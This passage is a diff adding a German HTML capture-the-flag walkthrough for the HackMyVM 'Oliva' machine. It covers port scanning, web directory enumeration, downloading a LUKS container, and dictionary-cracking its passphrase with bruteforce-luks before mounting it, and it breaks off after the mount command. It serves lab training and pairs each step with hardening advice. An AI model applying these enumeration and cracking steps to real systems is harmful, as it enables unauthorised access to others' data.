@@ -1,0 +1,1176 @@
+﻿<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Oliva - HackMyVM - Bericht</title>
+    <link rel="stylesheet" href="style.css">
+    <link rel="stylesheet" href="../../horizontale-navbar.css">
+    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
+</head>
+ <body>
+
+    <div class="header-bg">
+        <h1>Oliva - HackMyVM - Level: Easy - Bericht</h1>
+        <div class="level-container">
+            <h2>Easy</h2>
+            <div class="circle">
+                <div class="segment segment-1"></div>
+                <div class="segment segment-2"></div>
+                <div class="segment segment-3"></div>
+                <div class="inner"></div>
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <section class="tools-used">
+            <h2>Verwendete Tools</h2>
+            <div class="tools-grid">
+                <div class="tool-item">arp-scan</div>
+                <div class="tool-item">nmap</div>
+                <div class="tool-item">Texteditor (vi/nano etc.)</div>
+                <div class="tool-item">curl</div>
+                <div class="tool-item">feroxbuster</div>
+                <div class="tool-item">file</div>
+                <div class="tool-item">cryptsetup</div>
+                <div class="tool-item">bruteforce-luks</div>
+                <div class="tool-item">find</div>
+                <div class="tool-item">mkdir</div>
+                <div class="tool-item">mount</div>
+                <div class="tool-item">ssh</div>
+                <div class="tool-item">ss</div>
+                <div class="tool-item">mysql (MariaDB Client)</div>
+                <div class="tool-item">getcap</div>
+                <div class="tool-item">tr</div>
+                <div class="tool-item">john (John the Ripper)</div>
+                <div class="tool-item">cat</div>
+                <div class="tool-item">su</div>
+                <div class="tool-item">Standard Linux-Befehle</div>
+            </div>
+        </section>
+
+        <section class="toc">
+            <h2>Inhaltsverzeichnis</h2>
+            <ul>
+                <li><a href="#reconnaissance">Reconnaissance</a></li>
+                <li><a href="#web-enumeration">Web Enumeration</a></li>
+                <li><a href="#initial-access">Initial Access</a></li>
+                <li><a href="#privilege-escalation">Privilege Escalation</a></li>
+                <li><a href="#poc">Proof of Concept (Root)</a></li>
+                <li><a href="#flags">Flags</a></li>
+            </ul>
+        </section>
+
+        <section id="reconnaissance">
+            <h2>Reconnaissance</h2>
+
+<div class="code-block">
+    <div class="terminal">
+        <pre>
+ARP-Scan
+
+192.168.2.210	08:00:27:0e:28:6f	PCS Systemtechnik GmbH
+        </pre>
+    </div>
+</div>
+<p class="analysis"><strong>Analyse:</strong>
+Der erste Schritt ist die Identifizierung des Ziels im lokalen Netzwerk. Die Ausgabe zeigt das Ergebnis eines ARP-Scans (vermutlich `arp-scan -l | grep "PCS"` oder ähnlich, obwohl der genaue Befehl hier nicht gezeigt wird, aber das Ergebnis ist typisch dafür). Es wurde ein Gerät mit der IP-Adresse `192.168.2.210` gefunden. Die MAC-Adresse `08:00:27:0e:28:6f` und der Hersteller "PCS Systemtechnik GmbH" deuten auf eine virtuelle Maschine hin, wahrscheinlich Oracle VirtualBox.
+</p>
+<p class="evaluation"><strong>Bewertung:</strong>
+Ein Standardverfahren zur Host-Discovery im LAN. Die Identifizierung der IP-Adresse ist der grundlegende erste Schritt für alle weiteren Aktionen. Die Information über den Hersteller der Netzwerkkarte ist ein guter Hinweis auf die Virtualisierungsumgebung.
+</p>
+<p class="recommendation"><strong>Empfehlung (Pentester):</strong>
+Nachdem die IP-Adresse bekannt ist, sollte als Nächstes ein Portscan mit Nmap durchgeführt werden, um offene Ports und Dienste auf dem Ziel zu identifizieren.
+<br>
+<strong>Empfehlung (Admin):</strong>
+Eine Asset-Management-Datenbank und Netzwerküberwachung können helfen, bekannte und unbekannte Geräte im Netzwerk im Auge zu behalten. Die Erkennung durch ARP-Scans ist im LAN normal und schwer zu verhindern.
+</p>
+<hr>
+<div class="code-block">
+    <div class="terminal">
+        <pre>
+Hosts
+
+   192.168.2.210   oliva.hmv
+        </pre>
+    </div>
+</div>
+<p class="analysis"><strong>Analyse:</strong>
+Dieser Eintrag zeigt, dass die IP-Adresse `192.168.2.210` dem Hostnamen `oliva.hmv` zugeordnet wurde. Dies geschieht typischerweise durch einen Eintrag in die lokale `/etc/hosts`-Datei auf dem Angreifer-System (`sudo vi /etc/hosts` und Hinzufügen der Zeile).
+</p>
+<p class="evaluation"><strong>Bewertung:</strong>
+Ein sinnvoller Schritt, um die weitere Interaktion mit dem Zielsystem zu vereinfachen und um sicherzustellen, dass Webanwendungen, die auf Hostnamen basierende virtuelle Hosts verwenden, korrekt angesprochen werden. Es verbessert die Lesbarkeit von Befehlen und Logs.
+</p>
+<p class="recommendation"><strong>Empfehlung (Pentester):</strong>
+Verwenden Sie ab jetzt den Hostnamen `oliva.hmv` anstelle der IP-Adresse für Scans und Zugriffsversuche, insbesondere bei Webdiensten.
+<br>
+<strong>Empfehlung (Admin):</strong>
+Dies ist eine lokale Konfiguration auf dem Angreifer-System und hat keine direkten Auswirkungen auf das Ziel.
+</p>
+<hr>
+<div class="code-block">
+    <div class="terminal">
+        <pre>
+22/tcp open  ssh     OpenSSH 9.2p1 Debian 2 (protocol 2.0)
+80/tcp open  http    nginx 1.22.1
+        </pre>
+    </div>
+</div>
+<div class="code-block">
+    <div class="terminal">
+        <pre>
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-02 21:19 CEST
+Nmap scan report for oliva.hmv (192.168.2.210)
+Host is up (0.00012s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+<span class="command">22/tcp open  ssh     OpenSSH 9.2p1 Debian 2 (protocol 2.0)</span>
+| ssh-hostkey: 
+|   256 6d:84:71:14:03:7d:7e:c8:6f:dd:24:92:a8:8e:f7:e9 (ECDSA)
+|_  256 d8:5e:39:87:9e:a1:a6:75:9a:28:78:ce:84:f7:05:7a (ED25519)
+<span class="command">80/tcp open  http    nginx 1.22.1</span>
+|_http-server-header: nginx/1.22.1
+|_http-title: Welcome to nginx!
+MAC Address: <span class="command">08:00:27:0E:28:6F (PCS Systemtechnik/Oracle VirtualBox virtual NIC)</span>
+Device type: general purpose|router
+Running: <span class="command">Linux 4.X|5.X, MikroTik RouterOS 7.X</span>
+OS CPE: <span class="command">cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3</span>
+OS details: <span class="command">Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)</span>
+Network Distance: 1 hop
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.12 ms oliva.hmv (192.168.2.210)
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 10.35 seconds
+        </pre>
+    </div>
+</div>
+<p class="analysis"><strong>Analyse:</strong>
+Die erste kurze Liste (`22/tcp open ssh...`, `80/tcp open http...`) ist eine Vorab-Zusammenfassung der offenen Ports.
+Darauf folgt die detaillierte Ausgabe eines Nmap-Scans (vermutlich mit Optionen wie `-sV -sC -O` oder `-A`).
+Der Scan gegen `oliva.hmv` (192.168.2.210) zeigt:
+- **Port 22 (SSH):** Offen, läuft mit OpenSSH 9.2p1 Debian 2. Die Host-Keys (ECDSA und ED25519) werden angezeigt.
+- **Port 80 (HTTP):** Offen, läuft mit nginx 1.22.1. Der HTTP-Titel ist "Welcome to nginx!", die Standardseite von nginx.
+- **MAC-Adresse:** Bestätigt die vorherige Vermutung (PCS Systemtechnik/Oracle VirtualBox).
+- **Betriebssystem:** Nmap hat Schwierigkeiten, das Betriebssystem eindeutig zu identifizieren und schlägt mehrere Möglichkeiten vor, darunter Linux 4.X/5.X, MikroTik RouterOS und OpenWrt. Dies deutet auf ein Linux-basiertes System hin, aber die genaue Distribution ist noch unklar. Die Debian-Version von OpenSSH deutet jedoch stark auf Debian hin.
+- **Traceroute:** Zeigt, dass das Ziel direkt im lokalen Netzwerk erreichbar ist (1 Hop).
+</p>
+<p class="evaluation"><strong>Bewertung:</strong>
+Der Nmap-Scan liefert die wesentlichen Informationen für die nächsten Schritte. Wir haben zwei primäre Angriffsvektoren: SSH (Port 22) und HTTP (Port 80). Die Versionsinformationen von OpenSSH und nginx sind nützlich für die Suche nach bekannten Schwachstellen. Die Standard-nginx-Seite auf Port 80 deutet darauf hin, dass entweder keine benutzerdefinierte Webanwendung vorhanden ist oder diese in einem Unterverzeichnis liegt. Die OS-Fingerprinting-Ergebnisse sind etwas uneinheitlich, aber "Debian" ist aufgrund der OpenSSH-Version die wahrscheinlichste Annahme.
+</p>
+<p class="recommendation"><strong>Empfehlung (Pentester):</strong>
+Der nächste Schritt ist die genauere Untersuchung des Webservers auf Port 80. Suchen Sie nach versteckten Verzeichnissen oder Dateien, insbesondere nach Webanwendungen. Für SSH können später Brute-Force-Versuche mit gängigen Benutzernamen und Passwörtern oder die Suche nach exponierten Schlüsseln in Betracht gezogen werden, falls sich über den Webserver Benutzernamen ergeben.
+<br>
+<strong>Empfehlung (Admin):</strong>
+Stellen Sie sicher, dass nur notwendige Dienste exponiert sind. Halten Sie OpenSSH und nginx stets auf dem neuesten Stand. Wenn die Standard-nginx-Seite angezeigt wird, bedeutet dies, dass der Webserver zwar läuft, aber möglicherweise noch nicht für den produktiven Einsatz konfiguriert ist oder keine spezifische Anwendung bereitstellt. Konfigurieren Sie `ServerTokens Prod` (oder Äquivalent für nginx: `server_tokens off;`), um das Leaken genauer Serverversionen in HTTP-Headern zu minimieren.
+</p>
+<hr>
+<div class="code-block">
+    <div class="terminal">
+        <pre>
+* Host oliva.hmv:80 was resolved.
+* IPv6: (none)
+* IPv4: 192.168.2.210
+*   Trying 192.168.2.210:80...
+* Connected to oliva.hmv (192.168.2.210) port 80
+* using HTTP/1.x
+> HEAD / HTTP/1.1
+> Host: oliva.hmv
+> User-Agent: curl/8.13.0
+> Accept: */*
+> 
+* Request completely sent off
+< HTTP/1.1 200 OK
+< Server: nginx/1.22.1
+< Date: Mon, 02 Jun 2025 19:19:56 GMT
+< Content-Type: text/html
+< Content-Length: 615
+< Last-Modified: Tue, 04 Jul 2023 08:26:53 GMT
+< Connection: keep-alive
+< ETag: "64a3d7cd-267"
+< Accept-Ranges: bytes
+< 
+
+* Connection #0 to host oliva.hmv left intact
+        </pre>
+    </div>
+</div>
+<p class="analysis"><strong>Analyse:</strong>
+Hier wird ein `curl`-Befehl ausgeführt (vermutlich `curl -I http://oliva.hmv` oder `curl --head http://oliva.hmv`, da eine `HEAD`-Anfrage gesendet wird), um die HTTP-Header der Wurzelseite (`/`) auf Port 80 abzurufen. Die `-v` (verbose) Option von curl würde eine ähnliche Ausgabe erzeugen.
+Die Ausgabe zeigt:
+- Erfolgreiche Verbindung zu `oliva.hmv` (192.168.2.210) auf Port 80.
+- Eine `HEAD`-Anfrage wird gesendet.
+- Der Server antwortet mit `HTTP/1.1 200 OK`.
+- Die Header enthalten Informationen wie `Server: nginx/1.22.1`, `Content-Type: text/html`, `Content-Length: 615` und `ETag`.
+</p>
+<p class="evaluation"><strong>Bewertung:</strong>
+Die `HEAD`-Anfrage bestätigt die Ergebnisse des Nmap-Scans bezüglich des Webservers und der nginx-Version. Die Header liefern keine neuen, unerwarteten Informationen, bestätigen aber, dass der Server korrekt auf HTTP-Anfragen antwortet. Die `Content-Length` von 615 Bytes entspricht der Standard "Welcome to nginx!" Seite.
+</p>
+<p class="recommendation"><strong>Empfehlung (Pentester):</strong>
+Die Header-Analyse ist ein guter erster Schritt. Als Nächstes sollte eine Verzeichnis- und Datei-Enumeration auf dem Webserver erfolgen, um möglicherweise versteckte Inhalte oder Anwendungen zu finden.
+<br>
+<strong>Empfehlung (Admin):</strong>
+Das Offenlegen des `ETag`-Headers und der genauen `Server`-Version kann minimale Informationen für einen Angreifer liefern. Erwägen Sie, die Server-Tokens zu reduzieren (`server_tokens off;` in der nginx-Konfiguration) und die ETag-Generierung anzupassen, wenn dies als Risiko betrachtet wird.
+</p>
+        </section>
+
+        <section id="web-enumeration">
+            <h2>Web Enumeration</h2>
+
+<div class="code-block">
+    <div class="terminal">
+        <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">feroxbuster --url "http://oliva.hmv" --wordlist /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x .git,.php,.html,.xml,.zip,.7z,.tar,.bak,.sql,.py,.pl,.txt,.jpg,.jpeg,.png,.js,.aac,.ogg,.flac,.alac,.wav,.aiff,.dsd,.mp3,.mp4,.mkv,.phtml -s 200 301 302</span></div>
+        <pre>
+
+ ___  ___  __   __     __      __         __   ___
+|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
+|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
+by Ben "epi" Risher 🤓                 ver: 2.11.0
+───────────────────────────┬──────────────────────
+ 🎯  Target Url            │ http://oliva.hmv
+ 🚀  Threads               │ 50
+ 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
+ 👌  Status Codes          │ [200, 301, 302]
+ 💥  Timeout (secs)        │ 7
+ 🦡  User-Agent            │ feroxbuster/2.11.0
+ 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
+ 🔎  Extract Links         │ true
+ 💲  Extensions            │ [git, php, html, xml, zip, 7z, tar, bak, sql, py, pl, txt, jpg, jpeg, png, js, aac, ogg, flac, alac, wav, aiff, dsd, mp3, mp4, mkv, phtml]
+ 🏁  HTTP methods          │ [GET]
+ 🔃  Recursion Depth       │ 4
+───────────────────────────┴──────────────────────
+ 🏁  Press [ENTER] to use the Scan Management Menu™
+──────────────────────────────────────────────────
+<span class="command">200      GET       23l       75w      615c http://oliva.hmv/</span>
+<span class="command">200      GET    70541l   415824w 34717484c http://oliva.hmv/oliva</span>
+<span class="command">200      GET        5l       10w       69c http://oliva.hmv/index.php</span>
+<span class="command">200      GET       23l       75w      615c http://oliva.hmv/index.html</span>
+[##################>-] - 7m   5805880/6175288 23s     found:4       errors:0      
+🚨 Caught ctrl+c 🚨 saving scan state to ferox-http_oliva_hmv-1748897299.state ...
+[##################>-] - 7m   5806412/6175288 23s     found:4       errors:0      
+[##################>-] - 7m   5805576/6175260 14016/s http://oliva.hmv/
+        </pre>
+    </div>
+</div>
+<p class="analysis"><strong>Analyse:</strong>
+Ich setze `feroxbuster` ein, um nach Verzeichnissen und Dateien auf dem Webserver `http://oliva.hmv` zu suchen. Verwendet wird die Wortliste `directory-list-2.3-medium.txt` und eine breite Palette von Dateiendungen. Es wird nach Statuscodes 200, 301 und 302 gefiltert.
+Die Ergebnisse sind:
+- `http://oliva.hmv/`: Die Standard-nginx-Seite (615 Bytes).
+- `http://oliva.hmv/oliva`: Ein Verzeichnis oder eine Datei namens `oliva` wurde gefunden. Die Größe (34MB, 70541 Zeilen) ist sehr auffällig und deutet auf eine größere Datei hin, möglicherweise ein Backup, ein Download oder ein Container.
+- `http://oliva.hmv/index.php`: Eine PHP-Datei.
+- `http://oliva.hmv/index.html`: Die Standard-nginx-HTML-Seite.
+Der Scan wurde nach ca. 7 Minuten manuell abgebrochen.
+</p>
+<p class="evaluation"><strong>Bewertung:</strong>
+Der Fund von `/oliva` ist der mit Abstand interessanteste. Die Größe dieser Ressource ist signifikant und muss untersucht werden. Die Existenz von `index.php` neben `index.html` ist ebenfalls bemerkenswert und deutet auf serverseitige Logik hin. Das Abbrechen des Scans nach diesen Funden ist verständlich, da `/oliva` und `index.php` die vielversprechendsten Ziele für die weitere Untersuchung darstellen.
+</p>
+<p class="recommendation"><strong>Empfehlung (Pentester):</strong>
+Untersuchen Sie sofort `http://oliva.hmv/oliva`. Handelt es sich um ein Verzeichnis oder eine Datei? Wenn es eine Datei ist, laden Sie sie herunter und analysieren Sie den Inhalt (z.B. mit `file`, `strings`, Entpackungs-Tools). Untersuchen Sie auch `http://oliva.hmv/index.php` im Browser und dessen Quellcode.
+<br>
+<strong>Empfehlung (Admin):</strong>
+Stellen Sie sicher, dass keine unnötig großen Dateien oder sensible Informationen (wie Backups, Quellcode-Archive) öffentlich im Web-Root oder in Unterverzeichnissen zugänglich sind. Wenn Dateien zum Download angeboten werden müssen, stellen Sie sicher, dass dies beabsichtigt ist und keine vertraulichen Daten enthält. Überprüfen Sie die Notwendigkeit und den Inhalt von `index.php`.
+</p>
+<hr>
+<div class="code-block">
+    <div class="terminal">
+        <pre>
+http://oliva.hmv/index.php
+
+ Hi oliva, Here the pass to obtain root: CLICK! 
+        </pre>
+    </div>
+</div>
+<p class="analysis"><strong>Analyse:</strong>
+Dies ist der Inhalt der Seite `http://oliva.hmv/index.php`. Die Seite enthält eine direkte Nachricht an "oliva" mit dem Hinweis: "Here the pass to obtain root: CLICK!". Das Wort "CLICK!" ist vermutlich ein Link.
+</p>
+<p class="evaluation"><strong>Bewertung:</strong>
+Das ist ein sehr direkter und vielversprechender Hinweis! Es scheint, als ob diese Seite absichtlich eine Information oder einen Mechanismus bereitstellt, um Root-Zugriff zu erlangen oder zumindest das Passwort dafür. Der "CLICK!"-Link muss untersucht werden. Dies könnte ein absichtlich platzierter Hinweis im Rahmen der CTF-Challenge sein.
+</p>
+<p class="recommendation"><strong>Empfehlung (Pentester):</strong>
+Klicken Sie auf den "CLICK!"-Link oder untersuchen Sie im Quellcode der Seite, wohin dieser Link führt. Es ist sehr wahrscheinlich, dass dieser Link zur Datei `/oliva` führt, die `feroxbuster` gefunden hat. Laden Sie die Datei herunter, auf die der Link verweist.
+<br>
+<strong>Empfehlung (Admin):</strong>
+In einer realen Umgebung sollten niemals Passwörter oder Hinweise auf Root-Zugriff direkt in Webseiten eingebettet werden. Dies ist ein schwerwiegendes Sicherheitsrisiko. Jegliche Form von direkter Passwortweitergabe oder Mechanismen, die Root-Zugriff trivial ermöglichen, müssen vermieden werden. Stellen Sie sicher, dass Webseiteninhalte keine sensiblen Informationen preisgeben.
+</p>
+<hr>
+<div class="code-block">
+    <div class="terminal">
+        <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">file /home/ccat/Downloads/oliva</span></div>
+        <pre>
+/home/ccat/Downloads/oliva: <span class="command">LUKS encrypted file, ver 2, header size 16384, ID 3, algo sha256, salt 0x14fa423af24634e8..., UUID: 9a391896-2dd5-4f2c-84cf-1ba6e4e0577e, crc 0x6118d2d9b595355f..., at 0x1000 {"keyslots":{"0":{"type":"luks2","key_size":64,"af":{"type":"luks1","stripes":4000,"hash":"sha256"},"area":{"type":"raw","offset"</span>
+        </pre>
+    </div>
+</div>
+<p class="analysis"><strong>Analyse:</strong>
+Nachdem die Datei `oliva` (vermutlich über den "CLICK!"-Link auf `index.php` oder direkt von `http://oliva.hmv/oliva`) heruntergeladen wurde, wird sie auf meinem lokalen System mit dem `file`-Befehl untersucht.
+Die Ausgabe zeigt, dass `/home/ccat/Downloads/oliva` eine "LUKS encrypted file, ver 2" ist. LUKS (Linux Unified Key Setup) ist ein Standard zur Festplattenverschlüsselung unter Linux. Es werden verschiedene Metadaten wie Algorithmus (sha256), Salt und UUID angezeigt.
+</p>
+<p class="evaluation"><strong>Bewertung:</strong>
+Die Datei ist also ein verschlüsselter Container. Um an den Inhalt zu gelangen, wird eine Passphrase benötigt, um die LUKS-Verschlüsselung zu öffnen. Dies ist eine neue Hürde. Die Nachricht auf `index.php` ("Here the pass to obtain root") bezog sich also wahrscheinlich auf die Passphrase für diesen LUKS-Container, in dem sich dann das eigentliche Root-Passwort oder ein Hinweis darauf befindet.
+</p>
+<p class="recommendation"><strong>Empfehlung (Pentester):</strong>
+Die nächste Aufgabe besteht darin, die Passphrase für diesen LUKS-Container zu finden. Da die `index.php` keinen direkten Hinweis auf die Passphrase selbst gab (außer dem "CLICK!"-Link zur Datei), muss man entweder nach weiteren Hinweisen auf dem Webserver suchen oder versuchen, die Passphrase zu knacken (z.B. mit `bruteforce-luks` oder John the Ripper, falls eine Hash-Extraktion möglich ist, oder durch Ausprobieren von gängigen/vermuteten Passphrasen, die mit "oliva" in Verbindung stehen könnten).
+<br>
+<strong>Empfehlung (Admin):</strong>
+Wenn verschlüsselte Container oder Dateien verteilt werden, stellen Sie sicher, dass die Methode zur Verteilung der Passphrase sicher ist und nicht dazu führt, dass Unbefugte Zugriff auf die Passphrase und somit auf die verschlüsselten Daten erhalten. Die Sicherheit von LUKS hängt stark von der Stärke der verwendeten Passphrase ab.
+</p>
+<hr>
+<div class="code-block">
+    <div class="terminal">
+        <pre>
+http://oliva.hmv/index.html
+
+Welcome to nginx!
+
+If you see this page, the nginx web server is successfully installed and working. Further configuration is required.
+
+For online documentation and support please refer to nginx.org.
+Commercial support is available at nginx.com.
+
+Thank you for using nginx.
+        </pre>
+    </div>
+</div>
+<p class="analysis"><strong>Analyse:</strong>
+Dies ist der Inhalt der Standard-Begrüßungsseite von nginx (`index.html`) auf dem Zielserver. Sie bestätigt, dass nginx erfolgreich installiert ist und läuft, aber weitere Konfiguration benötigt.
+</p>
+<p class="evaluation"><strong>Bewertung:</strong>
+Diese Seite liefert keine neuen Informationen für den Angriff und ist die erwartete Standardseite, wenn keine andere Konfiguration für die Wurzel (`/`) des Webservers vorgenommen wurde.
+</p>
+<p class="recommendation"><strong>Empfehlung (Pentester):</strong>
+Diese Seite kann ignoriert werden, da `index.php` und die Datei `/oliva` die interessanteren Ziele sind.
+<br>
+<strong>Empfehlung (Admin):</strong>
+Es ist üblich, die Standard-Begrüßungsseite durch eigenen Inhalt oder eine Weiterleitung zu ersetzen, sobald der Webserver produktiv genutzt wird. Aus reiner Sicherheitssicht ist die Standardseite unkritisch, kann aber als Indikator für einen noch nicht vollständig konfigurierten Server dienen.
+</p>
+        </section>
+
+        <section id="initial-access">
+            <h2>Initial Access</h2>
+<div class="code-block">
+    <div class="terminal">
+        <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">cryptsetup luksOpen /home/ccat/Downloads/oliva oliva_decrypted</span></div>
+        <pre>
+Geben Sie die Passphrase für »/home/ccat/Downloads/oliva« ein: 
+        </pre>
+    </div>
+</div>
+<p class="analysis"><strong>Analyse:</strong>
+Ich versuche, den heruntergeladenen LUKS-Container `/home/ccat/Downloads/oliva` zu öffnen. Der Befehl `cryptsetup luksOpen` wird verwendet, um ein LUKS-verschlüsseltes Gerät zu entschlüsseln und es unter einem Mapping-Namen (hier `oliva_decrypted`) im Verzeichnis `/dev/mapper/` verfügbar zu machen.
+Das System fordert zur Eingabe der Passphrase auf.
+</p>
+<p class="evaluation"><strong>Bewertung:</strong>
+Da die Passphrase noch nicht bekannt ist, wird dieser erste Versuch wahrscheinlich scheitern oder erfordert, dass ich eine erratene Passphrase eingebe. Der nächste Schritt im Walkthrough zeigt den Brute-Force-Ansatz.
+</p>
+<p class="recommendation"><strong>Empfehlung (Pentester):</strong>
+Wenn die Passphrase unbekannt ist, müssen Tools zum Knacken von LUKS-Passphrasen verwendet werden, wie z.B. `bruteforce-luks` oder Hashcat (nach Extraktion des LUKS-Headers/Hashes).
+<br>
+<strong>Empfehlung (Admin):</strong>
+Verwenden Sie starke und einzigartige Passphrasen für LUKS-verschlüsselte Container. Die Sicherheit der verschlüsselten Daten hängt direkt von der Stärke dieser Passphrase ab.
+</p>
+<hr>
+<div class="code-block">
+    <div class="terminal">
+        <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">bruteforce-luks -t 5 -f /usr/share/wordlists/rockyou.txt /home/ccat/Downloads/oliva -v 15</span></div>
+        <pre>
+Warning: using dictionary mode, ignoring options -b, -e, -l, -m and -s.
+
+Tried passwords: 40
+Tried passwords per second: 2,666667
+Last tried password: butterfly
+...
+..
+.
+
+Tried passwords: 1287
+Tried passwords per second: 2,841584
+Last tried password: n3v_
+
+<span class="password">Password found: bebita</span>
+        </pre>
+    </div>
+</div>
+<p class="analysis"><strong>Analyse:</strong>
+Da die Passphrase für den LUKS-Container unbekannt ist, setze ich `bruteforce-luks` ein, um sie zu knacken.
+- `-t 5`: Verwendet 5 Threads für den Brute-Force-Versuch.
+- `-f /usr/share/wordlists/rockyou.txt`: Verwendet die `rockyou.txt` als Wortliste.
+- `/home/ccat/Downloads/oliva`: Die zu knackende LUKS-Datei.
+- `-v 15`: Setzt das Verbosity-Level (gibt alle 15 Sekunden eine Statusmeldung aus).
+Das Tool meldet nach einiger Zeit "Password found: bebita".
+</p>
+<p class="evaluation"><strong>Bewertung:</strong>
+Fantastisch! Die Passphrase für den LUKS-Container wurde erfolgreich als `bebita` identifiziert. Die Verwendung von `rockyou.txt` war hier erfolgreich, was darauf hindeutet, dass die Passphrase relativ einfach und in gängigen Wortlisten enthalten war.
+</p>
+<p class="recommendation"><strong>Empfehlung (Pentester):</strong>
+Verwenden Sie nun die gefundene Passphrase `bebita`, um den LUKS-Container mit `cryptsetup luksOpen` zu öffnen, den entschlüsselten Container zu mounten und den Inhalt zu untersuchen.
+<br>
+<strong>Empfehlung (Admin):</strong>
+Dies unterstreicht die Notwendigkeit, starke, einzigartige und nicht-wörterbuchbasierte Passphrasen für LUKS-Container zu verwenden. Die Passphrase `bebita` ist sehr schwach. Erwägen Sie die Verwendung von Keyfiles zusätzlich zu oder anstelle von Passphrasen für eine höhere Sicherheit bei LUKS.
+</p>
+<hr>
+<div class="code-block">
+    <div class="terminal">
+        <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">cryptsetup luksOpen /home/ccat/Downloads/oliva oliva_decrypted</span></div>
+        <pre>
+Geben Sie die Passphrase für »/home/ccat/Downloads/oliva« ein: <span class="command_input_hidden">(bebita)</span> 
+        </pre>
+    </div>
+</div>
+<div class="code-block">
+    <div class="terminal">
+        <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">cryptsetup luksOpen /home/ccat/Downloads/oliva oliva_decrypted</span></div>
+        <pre>
+<span class="password">Das Gerät »oliva_decrypted« existiert bereits.</span>
+        </pre>
+    </div>
+</div>
+<div class="code-block">
+    <div class="terminal">
+        <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">find / -name "oliva_decrypted" 2>/dev/null</span></div>
+        <pre>
+<span class="command">/dev/mapper/oliva_decrypted</span>
+        </pre>
+    </div>
+</div>
+<p class="analysis"><strong>Analyse:</strong>
+1.  Der erste `cryptsetup luksOpen`-Befehl wird erneut ausgeführt. Diesmal wird die zuvor gefundene Passphrase `bebita` eingegeben (im Log nicht sichtbar, aber impliziert). Da keine Fehlermeldung erscheint, war die Entschlüsselung erfolgreich.
+2.  Der zweite `cryptsetup luksOpen`-Befehl (identisch zum ersten) wird ausgeführt und gibt die Meldung "Das Gerät »oliva_decrypted« existiert bereits." zurück. Dies bestätigt, dass der Container bereits erfolgreich geöffnet und gemappt wurde.
+3.  `find / -name "oliva_decrypted" 2>/dev/null`: Sucht systemweit nach dem gemappten Gerät. Es wird unter `/dev/mapper/oliva_decrypted` gefunden.
+</p>
+<p class="evaluation"><strong>Bewertung:</strong>
+Der LUKS-Container wurde erfolgreich mit der Passphrase `bebita` entschlüsselt und ist nun als Blockgerät unter `/dev/mapper/oliva_decrypted` verfügbar. Die redundante Ausführung des `luksOpen`-Befehls ist unschädlich und dient hier als Bestätigung.
+</p>
+<p class="recommendation"><strong>Empfehlung (Pentester):</strong>
+Der nächste Schritt ist, ein Einhängepunkt-Verzeichnis zu erstellen und das entschlüsselte Gerät dort zu mounten, um auf das Dateisystem innerhalb des Containers zugreifen zu können.
+<br>
+<strong>Empfehlung (Admin):</strong>
+Keine spezifischen Empfehlungen für diesen Schritt, da er Teil des legitimen Entschlüsselungsprozesses nach Erlangung der Passphrase ist.
+</p>
+<hr>
+<div class="code-block">
+    <div class="terminal">
+        <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">mkdir /mnt/oliva_decrypted_content</span></div>
+    </div>
+</div>
+<div class="code-block">
+    <div class="terminal">
+        <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">cryptsetup status oliva_decrypted</span></div>
+        <pre>
+/dev/mapper/oliva_decrypted is active.
+  type:    LUKS2
+  cipher:  aes-xts-plain64
+  keysize: 512 bits
+  key location: keyring
+  device:  /dev/loop0
+  loop:    /home/ccat/Downloads/oliva
+  sector size:  512
+  offset:  32768 sectors
+  size:    6294 sectors
+  mode:    read/write
+        </pre>
+    </div>
+</div>
+<p class="analysis"><strong>Analyse:</strong>
+1.  `mkdir /mnt/oliva_decrypted_content`: Erstellt ein Verzeichnis, das als Einhängepunkt (Mount Point) für den Inhalt des entschlüsselten LUKS-Containers dienen soll.
+2.  `cryptsetup status oliva_decrypted`: Zeigt den Status des geöffneten LUKS-Geräts an. Es bestätigt, dass `/dev/mapper/oliva_decrypted` aktiv ist, den Typ (LUKS2), den Verschlüsselungsalgorithmus (aes-xts-plain64), die Schlüsselgröße (512 Bits) und weitere Details.
+</p>
+<p class="evaluation"><strong>Bewertung:</strong>
+Die Vorbereitungen zum Mounten des Dateisystems sind korrekt. Die Statusinformationen bestätigen die erfolgreiche Entschlüsselung und liefern technische Details über den LUKS-Container.
+</p>
+<p class="recommendation"><strong>Empfehlung (Pentester):</strong>
+Mounten Sie nun `/dev/mapper/oliva_decrypted` in das Verzeichnis `/mnt/oliva_decrypted_content` mit dem `mount`-Befehl.
+<br>
+<strong>Empfehlung (Admin):</strong>
+Keine spezifischen Empfehlungen für diesen Schritt.
+</p>
+<hr>
+<div class="code-block">
+    <div class="terminal">
+        <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">mount /dev/mapper/oliva_decrypted /mnt/oliva_decrypted_content</span></div>
+    </div>
+</div>
+<div class="code-block">
+    <div class="terminal">
+        <div class="prompt">┌──(root㉿CCat)-[~]
